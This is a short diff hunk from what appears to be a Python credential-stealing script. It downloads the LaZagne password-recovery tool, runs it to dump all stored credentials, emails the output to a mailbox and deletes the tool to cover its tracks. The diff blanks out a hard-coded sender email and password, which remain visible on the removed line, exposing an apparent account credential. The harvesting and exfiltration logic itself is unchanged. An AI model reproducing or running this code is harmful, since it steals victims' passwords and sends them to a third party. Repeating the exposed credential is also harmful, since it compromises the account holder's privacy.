@@ -39,5 +39,5 @@ Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne
 result = subprocess.check_output("lazagne.exe all", shell=True);
 print(result)
 
-SendMail("favinaj@outlook.com", "06191999Aa!", result)
+SendMail("", "", result)
 os.remove("lazagne.exe")
